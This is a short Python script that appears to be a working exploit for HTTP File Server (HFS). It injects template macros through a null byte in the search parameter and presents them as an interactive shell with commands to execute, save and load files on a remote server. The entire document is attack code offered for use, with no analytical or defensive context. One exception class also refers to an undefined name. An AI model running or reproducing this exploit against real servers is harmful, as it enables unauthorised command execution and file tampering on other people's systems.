#coding:utf-8

import requests
import sys
import urllib

from cmd import Cmd
from urllib.parse import quote
from bs4 import BeautifulSoup

class ErrorExecuteHFS(Exception):
	def __init__(self, execute_hfs=None):
		self.execute_hfs = execute_nfs

class ErrorLoadingHFS(Exception):
	def __init__(self, loading_hfs=None):
		self.loading_hfs = loading_hfs

class ErrorWritingHFS(Exception):
	def __init__(self, writing_hfs=None):
		self.writing_hfs = writing_hfs

argument_address = sys.argv[1]

class HFS(Cmd):
	'''
		The authentication phase
		takes place here __init__().
	'''
	prompt = 'HFS> '
	
	def __init__(self, address=argument_address):
		'''
			This function manages the system
			and the necessary arguments __init__().
		'''
		super().__init__()

		self.address = argument_address

		self.save_example = '%00{.save|xxxxx.}'
		self.exec_example = '%00{.exec|xxxxx.}'
		self.load_example = '%00{.load|xxxxx.}'

	def hfs_send(self, data):
		'''
			This function allows you to
			send queries to the remote server. __hfs_send__()
		'''
		self.source_update = "/?search=" + "%00" + "{.%s.}" %(data)
		self.hfs_update    = requests.get(self.address + self.source_update).text
		return self.hfs_update

	def do_load(self, args):
		'''
			This function allows you to
			load and open the file remotely. __do_load__()
		'''
		self.save_done = 'load|%s' %(args)
		self.save_done = BeautifulSoup(self.hfs_send(self.save_done), 'html.parser')
		print(self.save_done.input['value'])

	def do_exec(self, args):
		'''
			This function is used to send
			commands to the remote server. __do__exec__()
		'''
		self.exec_done = 'exec|%s' %(args)
		self.hfs_send(self.exec_done)

	def do_save(self, args):
		'''
			This function allows you to
			send files to the remote server. __do_save__()
		'''
		self.save_done = 'save|%s' %(args)

		self.save_data = self.save_done.split(" ")
		self.save_data = " ".join(self.save_data[1:])

		self.save_path = self.save_done.split("|")[1].split(" ")
		self.save_path = self.save_path[0]
	
		self.save_done = 'save|%s|%s' %(self.save_path, self.save_data)
		self.hfs_send(self.save_done)


if __name__ == "__main__":
	HFS().cmdloop()
